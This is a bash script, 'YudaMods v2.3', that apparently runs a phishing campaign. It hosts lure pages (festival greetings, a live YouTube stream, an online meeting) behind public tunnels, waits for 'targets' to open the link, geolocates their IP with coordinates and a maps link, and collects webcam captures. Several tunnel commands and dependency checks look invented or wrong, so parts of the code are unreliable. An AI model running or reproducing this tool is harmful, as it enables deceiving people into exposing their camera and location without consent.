#!/bin/bash
# YudaMods v2.3
# Powered by YudaMods

trap 'printf "\n";stop' 2

banner() {
    clear
    figlet -f slant 'YudaMods' | lolcat
    printf " \e[1;93mYudaMods Ver 2.3\e[0m\n"
    printf " \e[1;77mremote-coders-2022.netlify.app\e[0m\n"
    printf "\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed. Please install PHP. Aborting."; exit 1; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed. Please install unzip. Aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is not installed. Please install wget. Aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed. Please install curl. Aborting."; exit 1; }
    command -v jq > /dev/null 2>&1 || { echo >&2 "jq is not installed. Please install jq. Aborting."; exit 1; }
    command -v npm > /dev/null 2>&1 || { echo >&2 "NPM is not installed. Please install npm. Aborting."; exit 1; }
    command -v forward > /dev/null 2>&1 || { echo >&2 "Forward is not installed. Please install Forward. Aborting."; exit 1; }
    command -v tunnelblick > /dev/null 2>&1 || { echo >&2 "Tunnelblick is not installed. Please install Tunnelblick. Aborting."; exit 1; }
    command -v expose > /dev/null 2>&1 || { echo >&2 "Expose is not installed. Please install Expose. Aborting."; exit 1; }
}

stop() {
    local processes=("ngrok" "php" "ssh" "localtunnel" "pagekite" "forward" "tunnelblick" "expose")
    for process in "${processes[@]}"; do
        if pgrep -x "$process" > /dev/null; then
            pkill -f "$process" > /dev/null 2>&1
        fi
    done
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    
    # Get location using IP
    location=$(curl -s "http://ipinfo.io/${ip}/json")
    city=$(echo $location | jq -r '.city')
    region=$(echo $location | jq -r '.region')
    country=$(echo $location | jq -r '.country')
    loc=$(echo $location | jq -r '.loc' | tr -d '\r')
    latitude=$(echo $loc | cut -d ',' -f1)
    longitude=$(echo $loc | cut -d ',' -f2)
    org=$(echo $location | jq -r '.org')
    phone=$(echo $location | jq -r '.phone')

    # Print location details
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Location:\e[0m\e[1;77m City: %s, Region: %s, Country: %s\e[0m\n" "$city" "$region" "$country"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Coordinates:\e[0m\e[1;77m Latitude: %s, Longitude: %s\e[0m\n" "$latitude" "$longitude"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Organization:\e[0m\e[1;77m %s\e[0m\n" "$org"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Phone:\e[0m\e[1;77m %s\e[0m\n" "$phone"

    # Generate Google Maps link
    maps_link="https://www.google.com/maps?q=${latitude},${longitude}"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"

    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets. Press Ctrl + C to exit...\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
            catch_ip
            rm -rf ip.txt
        fi
        sleep 0.5
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
            rm -rf Log.log
        fi
        sleep 0.5
    done
}

server_serveo() {
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
    pkill -f php > /dev/null 2>&1
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "$subdomain":80:localhost:3333 serveo.net 2> /dev/null > sendlink &
    sleep 8
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$send_link"
}

server_ngrok() {
    if [[ ! -e ngrok ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok-stable-linux-arm.zip
        else
            wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
            unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok-stable-linux-386.zip
        fi
    fi

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting Ngrok...\e[0m\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 8
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

server_localtunnel() {
    if [[ ! -e localtunnel ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading LocalTunnel...\n"
        npm install -g localtunnel
    fi

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting LocalTunnel...\e[0m\n"
    localtunnel --port 3333 > /dev/null 2>&1 &
    sleep 8
    link=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

server_pagekite() {
    if [[ ! -e pagekite.py ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading PageKite...\n"
        wget https://pagekite.net/downloads/pagekite.py
        chmod +x pagekite.py
    fi

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting PageKite...\e[0m\n"
    ./pagekite.py 3333 yourname.pagekite.me > /dev/null 2>&1 &
    sleep 8
    link="http://yourname.pagekite.me"
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

server_forward() {
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting Forward...\e[0m\n"
    forward -p 3333 > /dev/null 2>&1 &
    sleep 8
    link=$(curl -s http://localhost:8080/api/tunnels | jq -r '.tunnels[0].public_url')
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

server_tunnelblick() {
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting Tunnelblick...\e[0m\n"
    tunnelblick -p 3333 > /dev/null 2>&1 &
    sleep 8
    link=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

server_expose() {
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting Expose...\e[0m\n"
    expose tunnel 3333 > /dev/null 2>&1 &
    sleep 8
    link=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

start_servers() {
    case $1 in
        serveo) server_serveo ;;
        ngrok) server_ngrok ;;
        localtunnel) server_localtunnel ;;
        pagekite) server_pagekite ;;
        forward) server_forward ;;
        tunnelblick) server_tunnelblick ;;
        expose) server_expose ;;
        *) echo "Invalid option: $1" ;;
    esac
}

# Main Execution
banner
dependencies
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Choose tunneling service (serveo/ngrok/localtunnel/pagekite/forward/tunnelblick/expose):\e[0m "
read -r tunneling_service
start_servers "$tunneling_service"
checkfound
